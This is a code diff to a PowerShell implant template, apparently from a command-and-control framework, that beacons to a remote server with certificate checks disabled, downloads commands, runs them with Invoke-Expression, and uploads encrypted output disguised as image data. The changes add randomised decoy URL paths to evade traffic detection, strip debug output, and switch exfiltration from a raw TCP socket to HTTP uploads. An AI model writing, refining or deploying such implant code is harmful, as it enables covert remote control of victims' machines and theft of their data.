@@ -1423,9 +1423,9 @@ function Decrypt-String2($key, $encryptedStringWithIV) {
     #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
 }
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-$RandomURI="'+$randomuri+'"
+$URI= "'+$randomuri+'"
 $Server = "$server/'+$randomuri+'"
-$ServerClean = "$server/"
+$ServerClean = $Server
 while($true)
 {
     $date = (Get-Date -Format "dd/MMM/yyyy")
@@ -1436,6 +1436,9 @@ while($true)
     $newsleep = $sleeptimeran|get-random
     if ($newsleep -lt 1) {$newsleep = 5} 
     start-sleep $newsleep
+    $URLS = "images/static/content/","news/?id=","webapp/static/","images/prints/","wordpress/site/","steam?p=","true/images/77/static?","holidngs/images/"
+    $RandomURI = Get-Random $URLS
+    $Server = "$ServerClean/$RandomURI$URI"
     $ReadCommand = (Get-Webclient).DownloadString("$Server")
 
     while($ReadCommand) {
@@ -1455,13 +1458,12 @@ while($true)
             } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
 
                 $modulename = $ReadCommandClear -replace "LoadModule",""
-                write-host $modulename
                 $Output = Invoke-Expression $modulename | out-string  
                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                 $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                 $Output = Encrypt-String2 $key $Output
                 $UploadBytes = getimgdata $Output
-                #(Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
 
             } else {
 
@@ -1472,29 +1474,10 @@ while($true)
                 $Output = $Output + $StdError
                 $error.clear()
             }
-            write-host $output
+
             $Output = Encrypt-String2 $key $Output
             $UploadBytes = getimgdata $Output
-
-            try
-            {
-                $client = New-Object System.Net.Sockets.TCPClient("$serverhost", $serverport)
-                $stream = $client.GetStream()
-                $bytes = New-Object System.Byte[] 5520420                
-                $cookie = $ReadCommand + "NudsWdidf4reWDnNFUE"
-                $URIBytes = [system.Text.Encoding]::UTF8.GetBytes($cookie+$RandomURI)
-                $CombinedByteSize = $URIBytes + $UploadBytes                
-                $stream.Write($CombinedByteSize,0,$CombinedByteSize.Length)
-                $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
-                $data = $EncodedText.GetString($CombinedByteSize,0,$CombinedByteSize.Length)
-                $stream.Flush()  
-                $client.Close()
-            }
-            catch
-            {
-                Write-Host -ForegroundColor Red "failed"
-                exit -1
-            }
+            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
 
             }
         }
